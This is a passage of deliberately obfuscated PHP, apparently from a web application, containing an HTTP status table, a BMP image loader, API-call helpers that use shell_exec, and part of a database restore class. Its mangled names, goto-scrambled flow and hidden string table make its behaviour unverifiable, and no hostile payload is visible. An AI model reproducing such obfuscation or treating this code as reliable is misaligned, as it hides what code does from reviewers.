$AÃõ—¨â…¤[33] && $D½±çŒÆåØ[2] === $AÃõ—¨â…¤[33]) { return !1; } return array($D½±çŒÆåØ[1] !== $AÃõ—¨â…¤[33] ? $D½±çŒÆåØ[1] : null, $D½±çŒÆåØ[2] !== $AÃõ—¨â…¤[33] ? $D½±çŒÆåØ[2] : null); } public static $statusCode = array("\x31\60\60" => "\x43\x6f\156\x74\151\156\165\145", "\61\60\x31" => "\x53\x77\x69\x74\143\150\151\156\147\40\120\x72\157\164\x6f\143\x6f\154", "\61\60\x32" => "\x50\x72\x6f\x63\x65\163\163\151\x6e\x67", "\61\x30\x33" => "\105\x61\x72\154\x79\x20\x48\x69\156\x74\163", "\x32\x30\60" => "\117\x4b", "\62\x30\x31" => "\x43\x72\x65\x61\164\x65\x64", "\x32\60\x32" => "\x41\x63\143\145\x70\164\145\x64", "\62\60\x33" => "\x4e\x6f\x6e\55\x41\x75\x74\150\157\x72\x69\164\141\x74\x69\166\x65\x20\111\156\x66\x6f\x72\x6d\x61\x74\151\157\156", "\x32\60\64" => "\x4e\x6f\40\103\157\156\x74\145\156\164", "\62\60\x35" => "\122\x65\163\145\x74\40\x43\x6f\156\x74\145\156\x74", "\62\60\x36" => "\120\x61\162\164\x69\x61\154\40\x43\157\156\x74\145\156\x74", "\62\x30\x37" => "\115\x75\154\x74\151\55\x53\164\x61\164\x75\163", "\63\x30\x30" => "\x4d\x75\154\x74\x69\160\154\x65\40\x43\x68\157\x69\143\x65\x73", "\x33\x30\x31" => "\x4d\x6f\166\x65\144\x20\x50\145\162\x6d\141\x6e\x65\x6e\x74\x6c\x79", "\63\x30\x32" => "\106\157\x75\156\x64", "\63\60\63" => "\123\x65\x65\x20\117\164\150\145\162", "\63\x30\64" => "\116\x6f\x74\40\115\157\x64\x69\x66\151\x65\144", "\x33\x30\x35" => "\x55\163\x65\40\120\x72\x6f\170\171", "\63\x30\67" => "\124\145\x6d\160\x6f\x72\x61\x72\x79\40\122\145\144\x69\162\145\143\x74", "\x33\60\x38" => "\120\x65\x72\x6d\141\156\x65\x6e\x74\40\122\145\144\151\x72\x65\143\164", "\64\x30\x30" => "\x42\141\x64\40\122\145\161\x75\x65\x73\164", "\x34\60\61" => "\x55\x6e\141\x75\164\150\x6f\162\x69\172\145\x64", "\64\60\x32" => "\x50\141\171\155\x65\x6e\x74\40\122\145\161\165\151\x72\x65\x64", "\x34\60\63" => "\106\x6f\x72\142\x69\144\144\145\156", "\64\x30\64" => "\116\x6f\x74\40\106\x6f\165\156\144", "\64\60\x35" => "\x4d\x65\x74\150\157\x64\x20\116\x6f\x74\40\101\x6c\154\x6f\167\x65\x64", "\x34\60\x36" => "\x4e\157\x74\40\x41\x63\x63\x65\160\164\x61\x62\154\145", "\64\x30\67" => "\x50\x72\x6f\x78\x79\40\101\x75\x74\150\145\156\164\x69\x63\141\164\151\157\x6e\x20\x52\x65\x71\x75\x69\162\145\144", "\64\60\x38" => "\122\145\x71\165\x65\163\x74\40\x54\x69\x6d\x65\x6f\x75\164", "\x34\60\x39" => "\103\157\x6e\146\154\x69\143\x74", "\64\61\x30" => "\x47\157\156\145", "\64\x31\61" => "\x4c\145\x6e\x67\x74\x68\x20\x52\x65\x71\x75\151\162\x65\144", "\64\x31\x32" => "\120\x72\x65\x63\x6f\x6e\x64\151\x74\151\x6f\x6e\x20\106\141\151\154\145\x64", "\x34\61\x33" => "\122\145\161\x75\x65\x73\x74\40\105\x6e\x74\x69\164\171\x20\x54\157\157\x20\114\x61\x72\x67\x65", "\x34\61\64" => "\x52\145\x71\165\145\x73\164\x20\125\x52\x49\x20\x54\157\x6f\40\x4c\x61\162\x67\145", "\64\x31\65" => "\125\x6e\163\165\160\x70\x6f\162\x74\x65\x64\40\x4d\x65\x64\151\x61\40\x54\x79\160\x65", "\64\61\66" => "\122\x65\x71\x75\145\x73\164\x65\144\40\x52\141\x6e\x67\x65\x20\x4e\157\x74\40\x53\141\x74\151\x73\x66\x69\141\142\x6c\x65", "\64\x31\x37" => "\105\170\x70\145\x63\x74\141\164\x69\157\156\40\x46\141\151\x6c\x65\144", "\x34\62\62" => "\125\156\x70\x72\157\143\145\163\163\x61\142\x6c\145\40\x45\x6e\164\x69\x74\x79", "\64\x32\x33" => "\114\x6f\143\153\145\144", "\64\x32\x34" => "\x46\141\151\x6c\x65\x64\40\104\x65\160\x65\x6e\144\x65\156\143\171", "\x34\62\65" => "\125\156\x6f\x72\144\x65\162\x65\x64\40\103\157\x6c\154\145\x63\164\151\157\x6e", "\x34\x32\66" => "\125\160\x67\x72\141\x64\x65\x20\x52\x65\161\165\x69\162\145\144", "\64\x32\70" => "\120\x72\x65\143\x6f\x6e\x64\x69\x74\151\157\156\x20\x52\x65\161\x75\151\x72\x65\144", "\x34\62\x39" => "\x54\157\157\40\x4d\141\156\x79\40\122\145\161\165\x65\x73\x74\x73", "\64\x33\61" => "\x52\x65\x71\165\145\x73\164\x20\110\x65\x61\144\x65\x72\x20\x46\151\145\x6c\x64\x73\40\x54\157\157\x20\x4c\x61\162\147\x65", "\64\64\x34" => "\116\x6f\40\x52\x65\163\x70\157\156\x73\x65", "\64\65\x30" => "\102\154\x6f\143\x6b\145\144\40\142\x79\x20\127\151\x6e\x64\157\x77\163\x20\120\x61\162\145\156\164\x61\154\x20\103\x6f\156\164\x72\157\x6c\x73", "\x34\x35\x31" => "\125\156\x61\x76\141\x69\154\141\142\154\145\40\x46\x6f\162\40\x4c\145\147\141\x6c\x20\122\x65\x61\163\x6f\156\x73", "\x34\x39\64" => "\x52\145\x71\165\x65\x73\164\x20\110\145\141\x64\145\x72\40\x54\157\x6f\x20\114\x61\162\147\145", "\x35\x30\x30" => "\x49\156\x74\145\162\x6e\x61\154\x20\x53\x65\162\x76\145\x72\40\105\x72\x72\x6f\x72", "\x35\x30\61" => "\x4e\157\164\40\x49\155\x70\x6c\145\x6d\x65\x6e\x74\145\144", "\x35\x30\62" => "\102\141\144\40\x47\141\164\145\x77\x61\171", "\65\60\63" => "\x53\145\162\166\151\143\145\x20\x55\156\x61\166\x61\151\x6c\141\x62\154\145", "\x35\x30\x34" => "\107\141\x74\x65\167\141\171\40\x54\151\x6d\145\157\x75\164", "\65\x30\65" => "\110\124\124\120\x20\x56\145\162\163\151\x6f\156\x20\x6e\157\x74\40\163\165\160\160\x6f\162\x74\145\144", "\65\60\67" => "\111\x6e\x73\165\x66\x66\151\143\x69\145\x6e\x74\x20\123\164\157\162\x61\x67\x65"); public static function code($bˆÄĞè®‹¿) { $AßÛ¦‡¼è‰ =& $_SERVER[‘®…¢À]; $bˆÄĞè®‹¿ = $bˆÄĞè®‹¿ . $AßÛ¦‡¼è‰[33]; $C‚Ÿòæ—— = self::$statusCode[$bˆÄĞè®‹¿]; $C‚Ÿòæ—— = $C‚Ÿòæ—— ? "\x48\124\124\120\x2f\61\x2e\x31\x20{$bˆÄĞè®‹¿}\40" . $C‚Ÿòæ—— : $AßÛ¦‡¼è‰[33]; return $C‚Ÿòæ——; } } class ImageGdBMP { public static function load($eêÌÂÅ±µ) { $eğ»Î›“ = fopen($eêÌÂÅ±µ, $_SERVER[‘®…¢À][1416]); if ($eğ»Î›“ === !1) { return !1; } $aç‰ö·õ¸’ = self::loadFromStream($eğ»Î›“); fclose($eğ»Î›“); return $aç‰ö·õ¸’; } public static function loadFromStream($BÉ©¯•Ùó‚) { $FÊ·†ÑÃ£ô =& $_SERVER[‘®…¢À]; $Câ…¾÷…ó = fread($BÉ©¯•Ùó‚, 14); if ($Câ…¾÷…ó === !1) { return !1; } if ($Câ…¾÷…ó[0] != $FÊ·†ÑÃ£ô[1728] || $Câ…¾÷…ó[1] != $FÊ·†ÑÃ£ô[1729]) { return !1; } $CÊìÒ’ÙÈğ = unpack($FÊ·†ÑÃ£ô[1730] . $FÊ·†ÑÃ£ô[1731] . $FÊ·†ÑÃ£ô[1732] . $FÊ·†ÑÃ£ô[1733] . $FÊ·†ÑÃ£ô[1734], $Câ…¾÷…ó); return self::loadFromStreamAndFileHeader($BÉ©¯•Ùó‚, $CÊìÒ’ÙÈğ); } public static function loadFromStreamAndFileHeader($E¿¼ÄÌÎ‡ğ, array $f–°¿µ˜¤´) { goto Béßƒ‚ÜŸ; Dñ¯¥Ë÷† : if ($dà¦ †©²ã == 0 || $cÂë”Ó×…Ÿ == 0 || $D¤ÑÁ¯æ­Ö != 1 || ($AÄ×ØŠ‚Âå & $d±¦µèº¨™) != 0 || ($AÄ×ØŠ‚Âå & $Bœ‚Û¹Îß) != 0 || ($AÄ×ØŠ‚Âå & $c»ä…ÇßÄ¬) != 0 || ($d±¦µèº¨™ & $Bœ‚Û¹Îß) != 0 || ($d±¦µèº¨™ & $c»ä…ÇßÄ¬) != 0 || ($Bœ‚Û¹Îß & $c»ä…ÇßÄ¬) != 0) { return !1; } if ($E¦ò¡¹»ø£ == 4 || $E¦ò¡¹»ø£ == 5) { $FÂ‚…îñÎŒ = stream_get_contents($E¿¼ÄÌÎ‡ğ, $Dé¹ğòö«¦); if ($FÂ‚…îñÎŒ === !1) { return !1; } return imagecreatefromstring($FÂ‚…îñÎŒ); } $bÅğŠñ¡² = $dà¦ †©²ã * $CàÂò¹ƒ±© + 31 >> 3 & ~3; goto AáØ§êËÃ¹; f‰¦Ñš¨Ë÷: if ($FÂ‚…îñÎŒ === !1) { return !1; } list(, $cŒÑÚ¦éˆÎ) = unpack($fØæ“ ¶Ú­[1735], $FÂ‚…îñÎŒ); if ($cŒÑÚ¦éˆÎ == 12) { goto F¼±µñ¤ø ; B‹á¯Ÿ„—Ù: $c»ä…ÇßÄ¬ = 255; goto Eò¯Ÿ‹ªñ·; F¼±µñ¤ø : $FÂ‚…îñÎŒ = fread($E¿¼ÄÌÎ‡ğ, $cŒÑÚ¦éˆÎ - 4); if ($FÂ‚…îñÎŒ === !1) { return !1; } extract(unpack($fØæ“ ¶Ú­[1736] . $fØæ“ ¶Ú­[1737] . $fØæ“ ¶Ú­[1738] . $fØæ“ ¶Ú­[1739], $FÂ‚…îñÎŒ)); goto cãÀ‚î«Å; cãÀ‚î«Å: $b’î³ö•ê = $BîÛÇ™Ğ¡ = $AÄ×ØŠ‚Âå = $E¦ò¡¹»ø£ = 0; $d±¦µèº¨™ = 16711680; $Bœ‚Û¹Îß = 65280; goto B‹á¯Ÿ„—Ù; Eò¯Ÿ‹ªñ·: } else { if (124 < $cŒÑÚ¦éˆÎ || $cŒÑÚ¦éˆÎ < 40) { return !1; } else { goto cÛ£”¼–ô; cÛ£”¼–ô: $FÂ‚…îñÎŒ = fread($E¿¼ÄÌÎ‡ğ, 36); if ($FÂ‚…îñÎŒ === !1) { return !1; } extract(unpack($fØæ“ ¶Ú­[1740] . $fØæ“ ¶Ú­[1741] . $fØæ“ ¶Ú­[1738] . $fØæ“ ¶Ú­[1742] . $fØæ“ ¶Ú­[1743] . $fØæ“ ¶Ú­[1744] . $fØæ“ ¶Ú­[1745] . $fØæ“ ¶Ú­[1746] . $fØæ“ ¶Ú­[1747] . $fØæ“ ¶Ú­[1748], $FÂ‚…îñÎŒ)); goto Fõ‘ƒ§•è·; Fõ‘ƒ§•è·: if ($dà¦ †©²ã & 2147483648) { $dà¦ †©²ã = -(~$dà¦ †©²ã & 4294967295) - 1; } if ($cÂë”Ó×…Ÿ & 2147483648) { $cÂë”Ó×…Ÿ = -(~$cÂë”Ó×…Ÿ & 4294967295) - 1; } if ($EºÖŒìª¿Œ & 2147483648) { $EºÖŒìª¿Œ = -(~$EºÖŒìª¿Œ & 4294967295) - 1; } goto DÙÙê¤ùÂÎ; Bğ–³åô¨›: if (($CàÂò¹ƒ±© == 16 || $CàÂò¹ƒ±© == 24 || $CàÂò¹ƒ±© == 32) && $E¦ò¡¹»ø£ == 0 && $d±¦µèº¨™ == 0 && $Bœ‚Û¹Îß == 0 && $c»ä…ÇßÄ¬ == 0) { switch ($CàÂò¹ƒ±©) { case 16: $d±¦µèº¨™ = 31744; $Bœ‚Û¹Îß = 992; $c»ä…ÇßÄ¬ = 31; break; case 24: case 32: $d±¦µèº¨™ = 16711680; $Bœ‚Û¹Îß = 65280; $c»ä…ÇßÄ¬ = 255; break; } } goto b¥æ½ƒ­‡; DÙÙê¤ùÂÎ: if ($bÜÌ‚­ğ’Ã & 2147483648) { $bÜÌ‚­ğ’Ã = -(~$bÜÌ‚­ğ’Ã & 4294967295) - 1; } if ($f–°¿µ˜¤´[$fØæ“ ¶Ú­[511]] != 0) { $B®ß³¸Î’… = $CàÂò¹ƒ±© == 1 || $CàÂò¹ƒ±© == 4 || $CàÂò¹ƒ±© == 8 ? ($b’î³ö•ê ? $b’î³ö•ê : pow(2, $CàÂò¹ƒ±©)) << 2 : 0; $E„Åå”¸ÎÖ = $Dé¹ğòö«¦ ? $Dé¹ğòö«¦ : ($dà¦ †©²ã * $CàÂò¹ƒ±© + 31 >> 3 & ~3) * abs($cÂë”Ó×…Ÿ); $bĞ¡å¡ñæ¬ = $f–°¿µ˜¤´[$fØæ“ ¶Ú­[511]] - $E„Åå”¸ÎÖ - $B®ß³¸Î’… - 14; if ($cŒÑÚ¦éˆÎ < $bĞ¡å¡ñæ¬ && 40 <= $cŒÑÚ¦éˆÎ && $cŒÑÚ¦éˆÎ <= 124) { $cŒÑÚ¦éˆÎ = $bĞ¡å¡ñæ¬; } } if ($cŒÑÚ¦éˆÎ - 40 > 0) { $FÂ‚…îñÎŒ = fread($E¿¼ÄÌÎ‡ğ, $cŒÑÚ¦éˆÎ - 40); if ($FÂ‚…îñÎŒ === !1) { return !1; } extract(unpack($fØæ“ ¶Ú­[1749] . $fØæ“ ¶Ú­[1750] . $fØæ“ ¶Ú­[1751] . $fØæ“ ¶Ú­[1752], $FÂ‚…îñÎŒ . str_repeat($fØæ“ ¶Ú­[1753], 120))); } else { $AÄ×ØŠ‚Âå = $d±¦µèº¨™ = $Bœ‚Û¹Îß = $c»ä…ÇßÄ¬ = 0; } goto Bğ–³åô¨›; b¥æ½ƒ­‡: } } goto Dñ¯¥Ë÷† ; Béßƒ‚ÜŸ: $fØæ“ ¶Ú­ =& $_SERVER[‘®…¢À]; if ($f–°¿µ˜¤´[$fØæ“ ¶Ú­[384]] != 19778) { return !1; } $FÂ‚…îñÎŒ = fread($E¿¼ÄÌÎ‡ğ, 4); goto f‰¦Ñš¨Ë÷; AáØ§êËÃ¹: $a£¡çá³ƒÁ = abs($cÂë”Ó×…Ÿ); $bÛƒ¶²”° = $cÂë”Ó×…Ÿ > 0 ? $a£¡çá³ƒÁ - 1 : 0; $cÉïŒ‘ç”© = $cÂë”Ó×…Ÿ > 0 ? -1 : 1; goto DÊË±¥óˆà; DÊË±¥óˆà: if ($CàÂò¹ƒ±© == 1 || $CàÂò¹ƒ±© == 4 || $CàÂò¹ƒ±© == 8) { goto dğÕè§ÛÒ; dğÕè§ÛÒ: $eŸø„ßÑöÏ = imagecreate($dà¦ †©²ã, $a£¡çá³ƒÁ); $A½Ô¢Ûîß = $cŒÑÚ¦éˆÎ == 12 ? 3 : 4; $AªğßŒ¬‹Ç = $b’î³ö•ê ? $b’î³ö•ê : pow(2, $CàÂò¹ƒ±©); goto Eé“Û®Óé¶; c¹‚œ±¿Í: $FÆ‘£¤îÎÙ = (1 << $CàÂò¹ƒ±©) - 1 << $c®ò›Öá›¡; if ($E¦ò¡¹»ø£ == 1 || $E¦ò¡¹»ø£ == 2) { $D¾Äí„ÜôŒ = 0; $dÙ‹Í‡ğÏ³ = $CàÂò¹ƒ±© >> 2 & 1; for (;;) { if ($D¾Äí„ÜôŒ < -1 || $D¾Äí„ÜôŒ > $dà¦ †©²ã || $bÛƒ¶²”° < -1 || $bÛƒ¶²”° > $cÂë”Ó×…Ÿ) { imagedestroy($eŸø„ßÑöÏ); return !1; } $FÂ‚…îñÎŒ = fread($E¿¼ÄÌÎ‡ğ, 1); if ($FÂ‚…îñÎŒ === !1) { imagedestroy($eŸø„ßÑöÏ); return !1; } switch ($FÂ‚…îñÎŒ) { case $fØæ“ ¶Ú­[1753]: $FÂ‚…îñÎŒ = fread($E¿¼ÄÌÎ‡ğ, 1); if ($FÂ‚…îñÎŒ === !1) { imagedestroy($eŸø„ßÑöÏ); return !1; } switch ($FÂ‚…îñÎŒ) { case $fØæ“ ¶Ú­[1753]: $bÛƒ¶²”° += $cÉïŒ‘ç”©; $D¾Äí„ÜôŒ = 0; break; case $fØæ“ ¶Ú­[1755]: $bÛƒ¶²”° = 0; $D¾Äí„ÜôŒ = 0; break 3; case $fØæ“ ¶Ú­[1756]: $FÂ‚…îñÎŒ = fread($E¿¼ÄÌÎ‡ğ, 2); if ($FÂ‚…îñÎŒ === !1) { imagedestroy($eŸø„ßÑöÏ); return !1; } list(, $DñëğÆœ³, $EŸÓ–°ƒ…ã) = unpack($fØæ“ ¶Ú­[1757], $FÂ‚…îñÎŒ); $D¾Äí„ÜôŒ += $DñëğÆœ³; $bÛƒ¶²”° += $EŸÓ–°ƒ…ã * $cÉïŒ‘ç”©; break; default: list(, $c‹òñÄ¹ï®) = unpack($fØæ“ ¶Ú­[1758], $FÂ‚…îñÎŒ); $Dì–¶Œ¼ = ($c‹òñÄ¹ï® >> $dÙ‹Í‡ğÏ³) + ($c‹òñÄ¹ï® & $dÙ‹Í‡ğÏ³); $FÂ‚…îñÎŒ = fread($E¿¼ÄÌÎ‡ğ, $Dì–¶Œ¼ + 1 & ~1); if ($FÂ‚…îñÎŒ === !1) { imagedestroy($eŸø„ßÑöÏ); return !1; } for ($BØ®÷÷Æ = 0, $FÙØçÑçö§ = 0; $BØ®÷÷Æ < $c‹òñÄ¹ï®; ++$BØ®÷÷Æ, ++$D¾Äí„ÜôŒ, $FÙØçÑçö§ += $CàÂò¹ƒ±©) { list(, $Eª¸ù×ÔÒ) = unpack($fØæ“ ¶Ú­[1758], $FÂ‚…îñÎŒ[$FÙØçÑçö§ >> 3]); $Bô–ö¶†·ø = $FÙØçÑçö§ & 7; imagesetpixel($eŸø„ßÑöÏ, $D¾Äí„ÜôŒ, $bÛƒ¶²”°, $B¶Ã¢Æ™Øò[($Eª¸ù×ÔÒ & $FÆ‘£¤îÎÙ >> $Bô–ö¶†·ø) >> $c®ò›Öá›¡ - $Bô–ö¶†·ø]); } break; } break; default: $dÚò÷‚Ç›» = fread($E¿¼ÄÌÎ‡ğ, 1); if ($dÚò÷‚Ç›» === !1) { imagedestroy($eŸø„ßÑöÏ); return !1; } list(, $Bëä²Š­Îƒ, $Eª¸ù×ÔÒ) = unpack($fØæ“ ¶Ú­[1757], $FÂ‚…îñÎŒ . $dÚò÷‚Ç›»); for ($BØ®÷÷Æ = 0, $FÙØçÑçö§ = 0; $BØ®÷÷Æ < $Bëä²Š­Îƒ; ++$BØ®÷÷Æ, ++$D¾Äí„ÜôŒ, $FÙØçÑçö§ += $CàÂò¹ƒ±©) { $Bô–ö¶†·ø = $FÙØçÑçö§ & 7; imagesetpixel($eŸø„ßÑöÏ, $D¾Äí„ÜôŒ, $bÛƒ¶²”°, $B¶Ã¢Æ™Øò[($Eª¸ù×ÔÒ & $FÆ‘£¤îÎÙ >> $Bô–ö¶†·ø) >> $c®ò›Öá›¡ - $Bô–ö¶†·ø]); } break; } } } else { for ($a¤ààÎ‘®É = 0; $a¤ààÎ‘®É < $a£¡çá³ƒÁ; ++$a¤ààÎ‘®É, $bÛƒ¶²”° += $cÉïŒ‘ç”©) { $FÂ‚…îñÎŒ = fread($E¿¼ÄÌÎ‡ğ, $bÅğŠñ¡²); if ($FÂ‚…îñÎŒ === !1) { imagedestroy($eŸø„ßÑöÏ); return !1; } $FÙØçÑçö§ = 0; for ($D¾Äí„ÜôŒ = 0; $D¾Äí„ÜôŒ < $dà¦ †©²ã; ++$D¾Äí„ÜôŒ, $FÙØçÑçö§ += $CàÂò¹ƒ±©) { list(, $Eª¸ù×ÔÒ) = unpack($fØæ“ ¶Ú­[1758], $FÂ‚…îñÎŒ[$FÙØçÑçö§ >> 3]); $Bô–ö¶†·ø = $FÙØçÑçö§ & 7; imagesetpixel($eŸø„ßÑöÏ, $D¾Äí„ÜôŒ, $bÛƒ¶²”°, $B¶Ã¢Æ™Øò[($Eª¸ù×ÔÒ & $FÆ‘£¤îÎÙ >> $Bô–ö¶†·ø) >> $c®ò›Öá›¡ - $Bô–ö¶†·ø]); } } } goto b¼ÛÊĞ¯øÅ; Eé“Û®Óé¶: $B¶Ã¢Æ™Øò = array(); for ($BØ®÷÷Æ = 0; $BØ®÷÷Æ < $AªğßŒ¬‹Ç; ++$BØ®÷÷Æ) { $FÂ‚…îñÎŒ = fread($E¿¼ÄÌÎ‡ğ, $A½Ô¢Ûîß); if ($FÂ‚…îñÎŒ === !1) { imagedestroy($eŸø„ßÑöÏ); return !1; } extract(unpack($fØæ“ ¶Ú­[1754], $FÂ‚…îñÎŒ . $fØæ“ ¶Ú­[1753])); $B¶Ã¢Æ™Øò[] = imagecolorallocate($eŸø„ßÑöÏ, $aİ¢¾˜›„, $fé…°íã¸, $Bô–ö¶†·ø); } $c®ò›Öá›¡ = 8 - $CàÂò¹ƒ±©; goto c¹‚œ±¿Í; b¼ÛÊĞ¯øÅ: } else { goto Aáåà® Ÿç; AÙ•‹†œµ’: $dÌ‡İÛÕÀí = $CàÂò¹ƒ±© >> 3; $AÁ¿µ´ñ¯† = $AÄ×ØŠ‚Âå ? 127 : 0; $eÎÀÜ•¸ÈÉ = $AÄ×ØŠ‚Âå ? 1 / $AÄ×ØŠ‚Âå : 1; goto Dêåƒ¨ŞÌ; Aáåà® Ÿç: $eŸø„ßÑöÏ = imagecreatetruecolor($dà¦ †©²ã, $a£¡çá³ƒÁ); imagealphablending($eŸø„ßÑöÏ, !1); if ($AÄ×ØŠ‚Âå) { imagesavealpha($eŸø„ßÑöÏ, !0); } goto AÙ•‹†œµ’; B¯ƒ©«ĞŒ: for ($a¤ààÎ‘®É = 0; $a¤ààÎ‘®É < $a£¡çá³ƒÁ; ++$a¤ààÎ‘®É, $bÛƒ¶²”° += $cÉïŒ‘ç”©) { $FÂ‚…îñÎŒ = fread($E¿¼ÄÌÎ‡ğ, $bÅğŠñ¡²); if ($FÂ‚…îñÎŒ === !1) { imagedestroy($eŸø„ßÑöÏ); return !1; } $FÙØçÑçö§ = 0; for ($D¾Äí„ÜôŒ = 0; $D¾Äí„ÜôŒ < $dà¦ †©²ã; ++$D¾Äí„ÜôŒ, $FÙØçÑçö§ += $dÌ‡İÛÕÀí) { list(, $Eª¸ù×ÔÒ) = unpack($fØæ“ ¶Ú­[1735], substr($FÂ‚…îñÎŒ, $FÙØçÑçö§, $dÌ‡İÛÕÀí) . $fØæ“ ¶Ú­[1759]); $A¯£ ŠòÆ = $Eª¸ù×ÔÒ & $AÄ×ØŠ‚Âå; $e’ÑæŞËÄÙ = $Eª¸ù×ÔÒ & $d±¦µèº¨™; $c©´™Œ‡ğ¾ = $Eª¸ù×ÔÒ & $Bœ‚Û¹Îß; $e¸¯±Ù×Ò¤ = $Eª¸ù×ÔÒ & $c»ä…ÇßÄ¬; $dÈ¹£Ú§Øƒ = $AÁ¿µ´ñ¯† - (($A¯£ ŠòÆ << 7) - $A¯£ ŠòÆ) * $eÎÀÜ•¸ÈÉ; $aİ¢¾˜›„ = (($e’ÑæŞËÄÙ << 8) - $e’ÑæŞËÄÙ) * $f½‡ò·­­…; $fé…°íã¸ = (($c©´™Œ‡ğ¾ << 8) - $c©´™Œ‡ğ¾) * $Fèœô¹µ‘; $Bô–ö¶†·ø = (($e¸¯±Ù×Ò¤ << 8) - $e¸¯±Ù×Ò¤) * $f•¿‡á¯; imagesetpixel($eŸø„ßÑöÏ, $D¾Äí„ÜôŒ, $bÛƒ¶²”°, $dÈ¹£Ú§Øƒ << 24 | $aİ¢¾˜›„ << 16 | $fé…°íã¸ << 8 | $Bô–ö¶†·ø); } } imagealphablending($eŸø„ßÑöÏ, !0); goto b†‰¿ŠÔö; Dêåƒ¨ŞÌ: $f½‡ò·­­… = $d±¦µèº¨™ ? 1 / $d±¦µèº¨™ : 1; $Fèœô¹µ‘ = $Bœ‚Û¹Îß ? 1 / $Bœ‚Û¹Îß : 1; $f•¿‡á¯ = $c»ä…ÇßÄ¬ ? 1 / $c»ä…ÇßÄ¬ : 1; goto B¯ƒ©«ĞŒ; b†‰¿ŠÔö: } return $eŸø„ßÑöÏ; goto a©†’êµ; a©†’êµ: } } goto fˆŸÖº­±Â; BŒá¥÷Èªğ: function ActionCall($eçšÛ¿†Ñ¢) { $C¨‰çß‰  = array_slice(func_get_args(), 1); return ActionApply($eçšÛ¿†Ñ¢, $C¨‰çß‰ ); } function ActionCallApi($dã£®¶Ø×™, $d’¨•–¡Ú³ = '') { goto dŸ¿¹ƒò¤Ø; dô¥²ÊËÛ¼: $f¹éÏÁòÄ– = Action($bŠöç‹’¿‘[23])->accessToken(); $dã£®¶Ø×™ = str_replace($bŠöç‹’¿‘[5], $bŠöç‹’¿‘[4], $dã£®¶Ø×™) . $bŠöç‹’¿‘[24] . $f¹éÏÁòÄ– . $Câˆ‡È‘îØ; $BšøšˆÏ°¶ = $bŠöç‹’¿‘[20]; goto Aº…Áî˜Œ²; dŸ¿¹ƒò¤Ø: $bŠöç‹’¿‘ =& $_SERVER[Á]; $Câˆ‡È‘îØ = $d’¨•–¡Ú³; if (is_array($d’¨•–¡Ú³)) { $Câˆ‡È‘îØ = $bŠöç‹’¿‘[20]; foreach ($d’¨•–¡Ú³ as $BÓ„×éÑğ => $eñÖŞÀµÅ) { $eñÖŞÀµÅ = is_array($eñÖŞÀµÅ) ? json_encode($eñÖŞÀµÅ) : $eñÖŞÀµÅ; $eñÖŞÀµÅ = is_bool($eñÖŞÀµÅ) ? intval($eñÖŞÀµÅ) : $eñÖŞÀµÅ; $Câˆ‡È‘îØ .= $bŠöç‹’¿‘[21] . $BÓ„×éÑğ . $bŠöç‹’¿‘[22] . rawurlencode($eñÖŞÀµÅ); } } goto dô¥²ÊËÛ¼; Dé²¨­ŞÜ‘: return $eõçºÈ†„; goto cùÔª¹–çö; D®Š¦¼±†: $DáÊ­¿øÛÃ = json_decode($BšøšˆÏ°¶, !0); $eõçºÈ†„ = is_array($DáÊ­¿øÛÃ) ? $DáÊ­¿øÛÃ : array($bŠöç‹’¿‘[32] => null, $bŠöç‹’¿‘[33] => $BšøšˆÏ°¶); if (!$DáÊ­¿øÛÃ) { echo $BšøšˆÏ°¶; } goto Dé²¨­ŞÜ‘; Aº…Áî˜Œ²: $bóÑ ğÎ = phpBinCommand(); if ($bóÑ ğÎ && function_exists($bŠöç‹’¿‘[25])) { $cÓ·äÑé¯Ğ = $bóÑ ğÎ . $bŠöç‹’¿‘[26] . BASIC_PATH . $bŠöç‹’¿‘[27] . escapeshellarg($dã£®¶Ø×™); $BšøšˆÏ°¶ = shell_exec($cÓ·äÑé¯Ğ); } if (!$BšøšˆÏ°¶) { $fÏÍÏº¡  = stream_context_create(array($bŠöç‹’¿‘[28] => array($bŠöç‹’¿‘[29] => 20, $bŠöç‹’¿‘[30] => $bŠöç‹’¿‘[31]))); $BšøšˆÏ°¶ = file_get_contents(app_host_get() . $dã£®¶Ø×™, !1, $fÏÍÏº¡ ); } goto D®Š¦¼±†; cùÔª¹–çö: } function ActionCallHook($CËÊÄ˜”ºë) { goto Aî¢¶–ö™; dÒéÕ¡ƒÑ: $GLOBALS[$cáí¾Î‡Ø[34]] = 1; $D“µÚ˜¡ìÙ = ActionApply($CËÊÄ˜”ºë, $e§¿•Ê„ã…); $aÃîŠ²£“ = ob_get_clean(); goto aí±ÔøÍ´; Aî¢¶–ö™: $cáí¾Î‡Ø =& $_SERVER[Á]; ob_start(); $e§¿•Ê„ã… = array_slice(func_get_args(), 1); goto dÒéÕ¡ƒÑ; aí±ÔøÍ´: $D“µÚ˜¡ìÙ = $aÃîŠ²£“ ? json_decode($aÃîŠ²£“, !0) : $D“µÚ˜¡ìÙ; $GLOBALS[$cáí¾Î‡Ø[34]] = 0; return $D“µÚ˜¡ìÙ; goto C˜“ŒÓ’¼„; C˜“ŒÓ’¼„: } goto B“™¿ÓÊˆİ; FæóˆŠÙ–¸: class Restore { function __construct($BôÀŸÈÒ, $F™°©¶½»  = '') { $this->database = $BôÀŸÈÒ; $this->type = $F™°©¶½» ; } public function model($a„ÖØº×óÛ = '') { return new ModelBase($a„ÖØº×óÛ, $_SERVER[‘®…¢À][33], $this->database); } public function db($f±¨ë´Š¦å = false) { goto B‡êº´‰á; F¦‹×¯ÜèÚ: $this->database = $C¿ÖØØìøŒ; $FĞØÁ°ß¦Æ->execute("\x75\x73\145\x20\x60{$eÙÚ§îĞÏÂ}\140"); return $FĞØÁ°ß¦Æ; goto f¬çÌ«ñø±; e¾‡ÃÆœøŒ: $eÙÚ§îĞÏÂ = $C¿ÖØØìøŒ[$D¤°î¸åË¢[231]]; $C¿ÖØØìøŒ[$D¤°î¸åË¢[231]] = $D¤°î¸åË¢[33]; if ($C¿ÖØØìøŒ[$D¤°î¸åË¢[706]] == $D¤°î¸åË¢[707]) { $eË¿·Ş®¬ = $C¿ÖØØìøŒ[$D¤°î¸åË¢[709]]; $C¿ÖØØìøŒ[$D¤°î¸åË¢[709]] = substr($eË¿·Ş®¬, 0, strrpos($eË¿·Ş®¬, $D¤°î¸åË¢[1277])); } goto Eì‹»µ; B‡êº´‰á: $D¤°î¸åË¢ =& $_SERVER[‘®…¢À]; $C¿ÖØØìøŒ = $this->database; if ($this->type == $D¤°î¸åË¢[9] || !$f±¨ë´Š¦å) { return $this->model()->db(); } goto e¾‡ÃÆœøŒ; Eì‹»µ: $this->database = $C¿ÖØØìøŒ; $FĞØÁ°ß¦Æ = $this->model()->db(); $cùªç¹æ–“ = 